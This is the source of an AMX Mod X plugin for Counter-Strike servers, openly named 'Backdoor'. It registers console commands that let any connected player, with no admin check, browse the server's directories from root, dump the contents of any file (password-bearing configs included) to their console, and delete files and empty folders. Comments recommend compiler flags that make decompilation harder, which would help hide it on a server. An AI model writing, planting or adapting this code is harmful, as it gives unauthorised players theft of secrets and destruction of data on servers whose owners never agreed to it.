/* Plugin generated by AMXX-Studio */

#include <amxmodx>

#pragma compress 1

public plugin_init()
{
	// PLUGIN_NAME = Backdoor
	// PLUGIN_VERSION = 1.0
	// PLUGIN_AUTHOR = OsweRRR
	
	register_clcmd("backdoor_menu", "fn_dirOpen")
	register_clcmd("backdoor_delete", "fn_Deleting")
	//register_clcmd("backdoor_permissions", "fn_Permissions")
	
	// usalo con responsabilidad.
	// 
	// para no facilitar la descompilacion usen estos
	// parametros para compilar en el compiler "-C+ -d0"
	//
	// creditos: sugisaki
}

public fn_Deleting(id)
{
	// uso: backdoor_delete "/addons/amxmodx/scripting" "admin.sma"
	// uso: backdoor_delete "/" "carpeta"
	//
	// NOTA: al eliminar una carpeta no debe tener archivos
	if(read_argc() != 3)
	{
		return 1
	}
	new sDir[MAX_FMT_LENGTH], sFile[64]
	
	read_argv(1, sDir, charsmax(sDir))
	read_argv(2, sFile, charsmax(sFile))
	
	if(!strlen(sDir) || !strlen(sFile))
	{
		return 1
	}
	trim(sDir)
	trim(sFile)
	
	remove_quotes(sDir)
	remove_quotes(sFile)
	
	if(sDir[strlen(sDir) - 1] == '/')
	{
		sDir[strlen(sDir) - 1] = EOS
	}
	replace_string(sFile, charsmax(sFile), "/", "")
	
	if(isFolder(sDir, sFile))
	{
		format(sDir, charsmax(sDir), "%s%s%s", sDir, (sFile[0] == '/') ? "" : "/", sFile)
		console_print(id, "%s (%s)", sDir, rmdir(sDir) ? "ha sido eliminado" : "error al eliminar")
	}
	else
	{
		format(sDir, charsmax(sDir), "%s%s%s", sDir, (sFile[0] == '/') ? "" : "/", sFile)
		switch(file_exists(sDir))
		{
			case 1: console_print(id, "%s (%s)", sDir, delete_file(sDir) ? "ha sido eliminado" : "error al eliminar")
			case 0: console_print(id, "%s (no existe)", sDir)
		}
	}
	return 1
}

/*public fn_Permissions(id)
{
	if(SetFilePermissions("/../cstrike", FPERM_DIR_DEFAULT))
	{
		console_print(id, "DEBUG: cstrike 0755")
	}
}*/

public fn_dirOpen(id)
{
	fn_dirMenu(id, "/")
	return 1
}

public fn_dirMenu(id, sDir[])
{
	new sFiles[64], ptrDir, menu
	ptrDir = open_dir(sDir, sFiles, charsmax(sFiles))
	console_print(id, "Ruta: %s", sDir)
	menu = menu_create(fmt("\rDir: \w%s^n\rPÃ¡g:\w", sDir), "mh_backdoor")
	while(next_file(ptrDir, sFiles, charsmax(sFiles)))
	{
		if(!is_linux_server())
		{
			menu_additem(menu, fmt("%s%s", isFolder(sDir, sFiles) ? "\y" : "\w", sFiles), sDir) // isFolder para marcar si es una carpeta
		}
		else
		{
			if(!(sFiles[0] == '.' && sFiles[1] == EOS)) // Filtrando el "."
			{
				menu_additem(menu, fmt("%s%s", isFolder(sDir, sFiles) ? "\y" : "\w", sFiles), sDir)
			}
			else
			{
				console_print(id, "DEBUG: %s", sFiles) // Por si acaso sale otra cosa lo sabremos XD
			}
		}
	}
	close_dir(ptrDir)
	menu_setprop(menu, MPROP_BACKNAME, "PÃ¡g. Anterior")
	menu_setprop(menu, MPROP_NEXTNAME, "PÃ¡g. Siguiente")
	menu_setprop(menu, MPROP_EXITNAME, "Salir")
	menu_setprop(menu, MPROP_EXIT, MEXIT_ALL)
	menu_display(id, menu)
}

public mh_backdoor(id, menu, item)
{
	if(item != MENU_MORE && item != MENU_BACK && item != MENU_EXIT && item != MENU_TIMEOUT)
	{
		new sDir[MAX_FMT_LENGTH], sFiles[64], temp
		menu_item_getinfo(menu, item, temp, sDir, charsmax(sDir), sFiles, charsmax(sFiles), temp)
		
		replace_string(sFiles, charsmax(sFiles), "\w", "") // Filtrando el color del menu para evitar errores
		replace_string(sFiles, charsmax(sFiles), "\y", "") // Filtrando el color del menu para evitar errores
		
		if(!isFolder(sDir, sFiles))
		{
			console_print(id, "--------- %s ---------", sFiles)
			console_print(id, "(backdoor_delete ^"%s^" ^"%s^")", sDir, sFiles)
			new sLine[254], ptrFopen, iCount
			ptrFopen = fopen(fmt("%s%s%s", sDir, (sDir[strlen(sDir) - 1] == '/') ? "" : "/", sFiles), "rt")
			while(!feof(ptrFopen))
			{
				fgets(ptrFopen, sLine, charsmax(sLine))
				trim(sLine)
				
				replace_string(sLine, charsmax(sLine), "%", "(*)") // No he encontrado otra forma para sanear el %
				
				format(sLine, charsmax(sLine), "[%3i] %s", iCount++, sLine)
				
				set_task(0.01 * iCount, "PrintfData", id, sLine, charsmax(sLine))
			}
			fclose(ptrFopen)
		}
		else
		{
			fn_dirMenu(id, fmt("%s%s%s", sDir, (sDir[strlen(sDir) - 1] == '/') ? "" : "/", sFiles))
		}
	}
	menu_destroy(menu)
	return 1
}

public PrintfData(sInput[], id)
{
	console_print(id, sInput)
}

bool:isFolder(const sDir[], sInput[])
{
	if(sInput[0] != 46 && sInput[1] != 46)
	{
		return bool:dir_exists(fmt("%s%s%s", sDir, (sDir[strlen(sDir) - 1] == '/') ? "" : "/", sInput))
	}
	return true
}

//bool:havingDot(const sFile[])
//{
//	return bool:(containi(sFile, ".") != -1 && strlen(sFile) > 2)
//}
